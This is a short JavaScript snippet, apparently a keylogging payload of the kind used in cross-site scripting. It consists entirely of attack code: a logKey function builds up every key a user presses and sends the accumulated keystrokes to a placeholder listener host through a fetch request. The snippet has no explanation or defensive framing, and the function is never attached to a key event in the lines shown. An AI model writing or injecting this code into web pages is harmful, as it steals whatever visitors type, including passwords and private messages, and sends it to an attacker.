var keys = '';
function logKey(event){
  keys += event.key
  fetch('http://<LISTENER>/k?key=' + keys);
}
